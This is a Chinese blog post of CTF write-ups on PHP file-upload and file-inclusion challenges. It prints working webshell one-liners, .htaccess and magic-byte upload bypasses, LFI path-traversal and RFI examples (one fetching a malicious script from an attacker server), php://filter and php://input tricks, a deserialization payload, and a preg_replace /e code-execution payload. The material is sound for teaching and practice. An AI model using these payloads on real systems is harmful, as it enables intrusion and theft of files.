---
title: '快速入门web-文件上传+包含及buuctf西电题解'
categories:
  - 
tags: []
abbrlink: ab930446
date: 2026-03-07 14:28:16
---
# 快速入门web-文件上传+包含及buuctf西电题解

知识点：

###### 1.include 是什么

###### `include "/flag";`

`include` 原本的设计目的是为了让你把写好的 PHP 代码（比如头部导航栏）拼接到当前页面里。

但是，如果你让它去 `include` 一个**不是 PHP 代码**的文件（比如 `/flag`），它会发生一个非常有趣的现象：

**它发现这玩意儿不是代码**：PHP 引擎打开 `/flag`，一看开头没有 `<?php`。

**它直接原样输出**：PHP 觉得“既然这不是代码，那我就把它当成普通的 HTML 文字，直接显示在网页上吧”。

**结果：** 你的 Flag 就这样被“顺便”打印在了屏幕上。







## [第二章 web进阶]文件上传 1 文件上传漏洞 题解

1.上传webshell.jpg文件

2.发现上传成功却无法打开

是因为上传的目录是随机的，所以用御剑扫描即可，找到对应网页 打开



## [ACTF2020 新生赛]Upload 1

十分波折的一道题目哈

1.文件上传php，失败，显示只能jpg等一堆正常格式

2.上传木马jpg，改成php，nonono

3.那改成phtml？黑名单绕过，可以

4.蚁剑连接得到flag

注意linux系统查看当前目录flag需要 cat /flag

```plaintext
1. 直接上传.php文件 → 失败（前端/后端检测后缀，仅允许jpg/png等图片格式）；
2. 上传图片马）→ 尝试抓包改回.php → 提示no（后端黑名单拦截.php）；
3. 黑名单绕过：改后缀为.phtml（Apache默认解析.phtml为PHP）→ 上传成功；
    细节：Content-Type为image/jpeg不改（绕MIME校验），仅改filename为xxx.phtml；
4. 蚁剑连接：
5. 拿flag：Linux系统下执行命令 cat /flag（题目flag在根目录）
```

```
GIF89
```





## [极客大挑战 2019]Upload

### 1题解

1.上传webshell.jpg被识破了

2.换种思路  文件里面 木马前面加个**GIF 图片文件的文件头标识**GIF89，上传成功

3.抓包后缀改成php，no；php5，no，说明是黑名单绕过，来个phtml，ok

4.蚁剑连接















## 13 第十三章 通幽关·灵纹诡影

这道题真让我难受

题目：

- 仅受仙灵之气浸润的「云纹图」可修复玉魄核心（建议扩展名：.jpg）
- 灵纹尺寸不得大于三寸（30000字节）
- 灵纹必须包含噬心魔印（十六进制校验码：FFD8FF）

1.首先他只是建议jpg，实际上你可以传php然后把头改成FFD8FF，保存后上传

2.抓包然后改成Content-Type: image/jpeg

3.蚁剑连接

我的错误点：

1.一开始用jpg上传，成功后没有更改后缀为php就蚁剑连接了。不是php怎么让木马生效？

2.改成了php，发现抓包后返回内容为：

**{% raw %}{{unquote(****"\xff\xd8\xff<script language=\"php\">eval\x28$_POST['cmd']\x29;</script>\x0d\x0a\x0d\x0a"****)}}{% endraw %}**

于是删掉头和尾再上传，发现上传不成功（服务器没法把`\xff\xd8\xff`转成真实的 FFD8FF 二进制头）

3.用<FilesMatch "\.jpg$">
    SetHandler application/x-httpd-php
</FilesMatch>

发现还是不成功

（

先传`.htaccess`再传`.jpg`木马的核心逻辑

「先改规则，再用规则」



`.htaccess`是「规则文件」，作用是告诉服务器：“从现在开始，`/uploads`目录下的`.jpg`文件都按 PHP 解析”。

传完`.htaccess`后，必须用`test.jpg`（含`phpinfo()`）验证规则是否生效：

- 若验证失败（看不到 PHP 信息），说明`.htaccess`没起作用，继续传`.jpg`木马也是浪费时间，直接放弃这条路；
- 若验证成功，再传真实木马，避免做无用功。





## 14 第十四章 御神关·补天玉碑

提示是htaccess

1.上传htaccess

2.上传木马图

3.蚁剑连接

这里蚁剑出现返回数据为空，是因为我的木马是<script language="php">eval($_POST['cmd']);</script>

| 写法                                  | 兼容性        | 是否生效 | 蚁剑连接结果           |
| ------------------------------------- | ------------- | -------- | ---------------------- |
| `<?php eval($_POST['cmd']);?>`        | 所有 PHP 版本 | ✅ 生效   | 正常（空返回但可操作） |
| `<script language="php">...</script>` | 仅 PHP5.3-    | ❌ 不生效 | 完全空返回，无法操作   |









## [BSidesCF 2020]Had a bad day

### 1

## 文件包含漏洞

#### 1. 本地文件包含（LFI）

比如 PHP 网站有代码：`include($_GET['page']);`

攻击者访问：`http://xxx.com/index.php?page=../../../../etc/passwd`

→ 服务器会读取 Linux 系统的`/etc/passwd`文件（存储用户信息的敏感文件）并返回。

#### 2. 远程文件包含（RFI）

如果服务器允许包含远程文件，代码还是`include($_GET['page']);`

攻击者访问：`http://xxx.com/index.php?page=http://攻击者服务器/恶意木马.php`→ 服务器会下载并执行这个远程木马，攻击者直接控制服务器。



1.先用伪协议读取index.php源码

```
php://filter/read=convert.base64-encode/resource=index
```

为什么不加php变成index.php，因为后端自动拼接php给文件了



源码:

```

            </div>
            <h3>Cheer up!</h3>
              <p>
                Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!
              </p>
              <div class="page-include">
              <?php
				$file = $_GET['category'];

				if(isset($file))
				{
					if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
						include ($file . '.php');
					}
					else{
						echo "Sorry, we currently only support woofers and meowers.";
					}
				}
				?>
			</div>
 
```



漏洞 1：strpos($file, "index") 少写了!== false（最致命）
strpos函数的返回规则：

    找到字符串：返回匹配的位置（数字，比如indexabc返回 0）；
    没找到：返回false。

正常校验应该写strpos(...) !== false（严格判断 “找到”），但代码里只写了strpos($file, "index")：

    只要$file里有index，strpos返回数字（非 false），条件成立；
    更关键：如果$file以index开头（比如index../../etc/passwd），strpos返回 0，条件也成立！



漏洞 2：include(`$file . '.php'`) 是 “拼接后缀”，可通过截断 / 路径穿越绕
代码会自动给`$file`加.php后缀（比如传woofers，实际包含woofers.php），但攻击者可以用「路径穿越 + 空字节 / 截断」绕过：

    比如传woofers/../../etc/passwd%00：
    拼接后变成woofers/../../etc/passwd%00.php；
    %00是 PHP 的 “空字节截断”，会让 PHP 忽略后面的.php，实际包含woofers/../../etc/passwd（读取系统敏感文件）。



2.访问 index.php?category=woofers/../flag

为什么这么做？



`文件包含逻辑：`

代码会把用户传入的 category 参数值（也就是 woofers/../flag）拼接到 include 函数里，还会自动加 .php 后缀，即 include(参数值 + '.php')；

`白名单校验逻辑：`

只要参数值里包含 woofers/meowers/index，就允许执行这个 include 操作（否则拒绝）。

​	

    1.参数值woofers/../flag的含义
    
    /../：是「路径穿越符」（Linux/PHP 里，A/../B 等价于 B）；
    比如woofers/../flag → 实际等价于flag（先进入 woofers 目录，再返回上一级，最终指向 flag）；
    整个参数值的核心：用woofers凑白名单，用/../抵消掉它，最终指向flag。

```
2.代码拼接后的实际包含路径
代码会自动给参数值加.php后缀，所以：
用户传的category=woofers/../flag → 拼接后变成 woofers/../flag.php。
```



抓包得到多出了一句话：

​       <!-- Can you read this flag? -->

出现了别的内容，包含成功了flag.php，但是这里也说了flag需要读取
利用php://filter伪协议可以套一层协议读取flag.php



3.读取flag



伪协议格式：

?file=php://filter/read=convert.base64-encode/resource=你想要看的文件



php://filter伪协议可以套一层协议，就像：

```
php://filter/read=convert.base64-encode/woofers/resource=flag
```

这样提交的参数既包含有woofers这个字符串，也不会影响正常的包含，得到Flag.php：







## 11 第十一章 千机变·破妄之眼

省流：HDdss看到了 **GET**  参数名由`m,n,o,p,q`这五个字母组成（每个字母出现且仅出现一次），长度正好为 5，虽然不清楚字母的具体顺序，但是他知道**参数名等于参数值**才能进入。

其实也就是输入mnopq=mnopq就ok，关键是你不知道顺序，也无法短时间内枚举，那就抛给脚本

```
import itertools
import requests

for p in itertools.permutations("mnopq"):   #itertools.permutations这就在枚举
    k = "".join(p)  #把p写进去
    r = requests.get("http://127.0.0.1:48386/", params={k: k})  #params={k:k}?-->mnopq=mnopq
    if "flag" in r.text:
        print(k)
        print(r.text)
        break
```



1.`params` 是 **requests 帮你自动处理 GET 参数的东西**

2.

```
requests.get(url, params={"a": "1"})
```

requests 内部其实做了👇

url + "?" + "a=1"

也就是：

http://target/index.php?a=1



然后出现了flag.php，find.php 

分别进去发现：

flag.php 他说答案已经在这里了，你看不到

find.php 是一个新的查看界面，查看flag，仍然出现”答案已经在这里了，你看不到“

所以换个思路，我们可以用伪协议读取64编码过的flag.php源码



```
php://filter/read=convert.base64-encode/resource=./flag.php
```



![image-20251218152437400](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20251218152437400.png)















## moectf web 这是...Webshell？



```
 <?php
highlight_file(__FILE__);
if(isset($_GET['shell'])) {
    $shell = $_GET['shell'];
    if(!preg_match('/[A-Za-z0-9]/is', $_GET['shell'])) {
        eval($shell);
    } else {
        echo "Hacker!";
    }
}
?> 
```

所有字母数字都被过滤了

因为直接写命令的路被堵死，所以 “上传命令文件→用纯符号找文件执行”











#### Payload（`?shell=?><?=`.+/???/????????[@-[]`;?>`）

| 部分            | 作用                                 | 通俗解释                                                     |
| --------------- | ------------------------------------ | ------------------------------------------------------------ |
| `?><?=`         | 闭合原 PHP 标签，开启短标签执行      | 原代码是`eval($shell)`，加这个能直接执行后面的内容           |
| `.`             | 执行系统命令的简写                   | 在 Linux 里，`. filename` 等价于 `source filename`（执行文件里的命令） |
| `/???/????????` | 通配符，匹配「临时文件路径」         | 上传的文件会被 PHP 存到系统临时目录（比如 `/tmp/phpXXXXXX`），`???` 匹配 `tmp`，`????????` 匹配随机文件名（8 个字符） |
| `[@-[]`         | 通配符，匹配「临时文件名的最后部分」 | `@` 的 ASCII 码是 64；                                                           `[` 的 ASCII 码是 91；                                                                             `[@-[]` 翻译：**匹配 ASCII 码 64 到 91 之间的所有字符**。                                                                       利用 ASCII 码范围匹配随机字符，确保能精准命中上传的临时文件 |



`[@-[]` 匹配的是 ASCII 码**64（@）到 91（[）** 的字符，包含：

   @（64）、A-Z（65-90）、[（91）；



Payload 翻译：`执行 /tmp/ 目录下的那个PHP临时文件（也就是我们上传的含命令的文件）`









上传的文件里写：



```bash
#! /bin/bash
env
```

- `#! /bin/bash`：告诉系统这是一个 bash 脚本，要按命令执行；
- `env`：输出系统环境变量（很多 CTF 的 flag 会藏在环境变量里，比如 `flag=xxx`）；
- 也可以把 `env` 改成 `cat /flag`，直接读取 flag 文件。





























## [ZJCTF 2019]NiZhuanSiWei

### 1





------

### 1. `file_get_contents` 是什么？（读取）

它的工作是读取文件内容。

**核心逻辑是：** 你给它一个“路径”，它就把那个路径里的东西全部读出来，变成一个字符串。

- **常规用法：** `file_get_contents("a.txt");` —— 机器人去读电脑硬盘上的 `a.txt` 文件。
- **网络用法：** `file_get_contents("http://google.com");` —— 机器人去互联网上下载网页内容。



------

### 2. 伪协议是什么？（拿东西工具）

“协议”通常是指获取数据的规则（比如 `http://` 是从网上拿，`file://` 是从本地硬盘拿）。

**“伪协议”（Wrappers）** 是**特殊快捷方式**。它告诉 PHP：“不要去硬盘找，也不要去网上找，去我指定的**特殊位置**找数据”。

------

### 3. 为什么会有 `php://input` 这种东西？

在 Web 开发中，有些数据并不在 URL 里，也不在文件里，而是在 **HTTP 请求的“身体”（Body）** 里。

PHP 为了能方便地拿到这个“身体”里的原始数据，就发明了 `php://input` 这个伪协议。

- 当你写 `file_get_contents("php://input")` 时，你实际上是在命令 PHP：

  > “嘿，直接去**当前的 HTTP 请求包**里，把人家发过来的 **POST 数据**原封不动地抓出来给我。”

------

### 4. 常见的伪协议全家桶

| **伪协议名称**     | **作用**           | **CTF 常见用途**                                             |
| ------------------ | ------------------ | ------------------------------------------------------------ |
| **`file://`**      | 读取本地文件       | 读取服务器上的 `/etc/passwd` 等敏感文件。                    |
| **`php://filter`** | **过滤器**         | **最强神器。** 可以把源码 Base64 编码后再读出来，防止源码被执行，从而看到源码。 |
| **`php://input`**  | 读取 POST 原始数据 | 绕过 `if($a == "hello")` 这种逻辑，直接从 Body 传值。        |
| **`data://`**      | 数据流             | 直接把字符串写在 URL 里当作文件内容。                        |

------

题目：

```
 <?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php 
        //include($file); 它会打开file文件，然后在里面找`<?php  ?>`并执行，如果没有就全部打印出来。
        此时，那个file文件的内容都被包含到这个文件的内存里了
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?> 
```





第一关：welcome to the zjctf

get传参，post塞内容

```
curl -X -POST "http://58974225-e8a3-46c6-80ae-b23e543ed37a.node5.buuoj.cn:81/?text=:php//input" -d "welcome to the zjctf"
```

![image-20260122092641565](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260122092641565.png)

第二关：查看提示中uesless.php

问题：怎么打印这个php呢？在代码中并没有任何显示结果

但是看到include(file)

或许我们可以通过给file传参伪协议filter，获取base64编码过后的源代码

filter伪协议使用格式：

```
php://filter/read=convert.base64-encode/resource=目标文件名
```



```
-POST /?text=php://input&file=php://filter/read=convert.base64-encode/resource=useless.php
...
welcome to the zjctf
```

![image-2170920260122094816.png](/images/image-2170920260122094816.png)



解码

```
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```



第三关：魔法函数+反序列化

1.__tostring()

魔法函数：以__开头，逻辑是当他的类对象被当作字符串时（echo/print），就会被触发执行

所以我们让这里的魔法函数被触发，就能读取file，我们再让file为flag.php

不就可以读取flag.php了么？



做法：

通过 **GET 传参 `file=useless.php`** 我们利用文件包含漏洞，将 useless.php加载至当前内存；

接着，看到 `unserialize()` ，我们需要构造一个序列化的 `Flag` 对象的实体，并通过属性篡改将其内部的 `$file` 变量指向目标文件 `flag.php`；

最后，借助主代码中的 `echo $password` 强制触发 `__toString()` 魔术方法，从而执行魔法方法下面的 `file_get_contents()` 读取并输出 flag.php 的内容。



payload：

```
&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```



```
-POST /?text=php://input&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
...
welcome to the zjctf
```



反序列化脚本：

```
<?php

class Flag{
    public $file;
}

$goal = new Flag;
$goal->file="flag.php";

$payload = serialize($goal);

echo urlencode($payload);
echo "</br>";
echo $payload;
?>

输出：
O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```











## [BJDCTF2020]ZJCTF，不过如此

### 1   题解 c！

在 PHP 中，`preg_replace` 是一个强大的正则表达式替换函数。它可以在一个字符串中使用正则表达式搜索和替换指定的文本。

函数语法如下：
preg_replace($pattern, $replacement, $subject);

这里的 `$pattern` 是一个正则表达式字符串，用于指定搜索的模式， `$replacement` 是替换成的字符串， `$subject` 是要搜索和替换的原始字符串或字符串数组。

`preg_replace` 函数返回一个替换后的字符串或数组。



1.观察代码

```
<?php

error_reporting(0);         //关闭报错反馈，url中要有"text"参数，url中要有"file"参数
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){       //存在$text参数  and  查找名称为$text的文件且文件内容为"I                                                严格等于                                                               have a dream"
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";     //回显获取的文件内容
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php               //文件包含，将名为$file的文件引入此php代码(后面的next.php注释就代表下个php就这文件了)
    
}
else{
    highlight_file(__FILE__);
}
?>
```

1.1 `isset()`：函数，意思是 “检查变量是否存在且不为空”。

判断 “你有没有传`text`参数”—— 如果没传`text`，或者传了但值是空的，就不满足这句话了

1.2 `r`是`read`（读取）的缩写，告诉 PHP：“我只想读取`$text`指向的内容，不做写入、修改等操作”

1.3 `file_get_contents()`能识别 PHP 伪协议，不用依赖服务器上的任何真实文件



2.理解：[]()

你现在需要一个现成的文件然后里面内容是：

但是没有现成的文件

所以我们构造一个，使用伪协议就ok

  伪协议使用：   php://input



3.使用

用burpsuite抓包改报头，伪协议使用php://input，格式如下 

```html
POST /..?参数=php://input



 



...



 



php代码
```

发现也没啥



4.继续，构造**$file**

前面代码分析过了**$file**的值极有可能是next.php，写上来试试

**POST** /?**text**=**php://input**&**file**=**next.php** **HTTP/1.1**



得到base64一堆密码，解码并读取

5.读取

```
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

// 核心函数：用/e修饰符 会执行代码
function complex($re, $str) {
    return preg_replace(         
        '/(' . $re . ')/ei',        // $re是你传的参数名（正则），/ei会执行替换后的代码
        'strtolower("\\1")',        // \\1是匹配到的$str内容，会被当成代码执行
        $str                        // $str是你传的参数值
    );
}
// str 会被放进 \\1 里面，
  strtolower("\\1")会被放进 (' . $re . ') 里面
  变成  strtolower("str")



// 遍历所有GET参数：参数名→$re，参数值→$str
foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";  // 调用complex函数，触发preg_replace
}

// 目标函数：执行cmd命令
function getFlag(){
	@eval($_GET['cmd']);  // 只要调用这个函数，就能执行cmd参数
}
?>


```



6.构造

​    $re = 	S*   		 cmd

​    $str =	{${getFlag()}}       system('ls')

// str 会被放进 \\1 里面，
  strtolower("\\1")会被放进 (' . $re . ') 里面
  变成  strtolower("str")

1.得到strtolower("{${getFlag()}}")，遇到/e执行getFlag()

2.执行，因为cmd=system('ls')，所以

```
@eval($_GET[' cmd '])便变成了@eval(system('ls'))
```

`eval()`会把这个字符串当成 PHP 代码来运行

所以能得到ls显示结果

所以我们构造：

```plaintext
http://目标地址/next.php?\S*={${getFlag()}}&cmd=system('ls');
```

得到：相应内容；

以此类推，找到flag，cat它

bin dev etc flag home lib media mnt proc root run sbin srv sys tmp usr var system('ls ../../../../');

```plaintext
http://目标地址/next.php&\S*={${getFlag()}}&cmd=system('cat /flag');   //       cat /flag 表示读取根目录下的flag文件。
```

```bash
      (url).../next.php&\S*={${getFlag()}}&cmd=system('linux命令');
```









### 

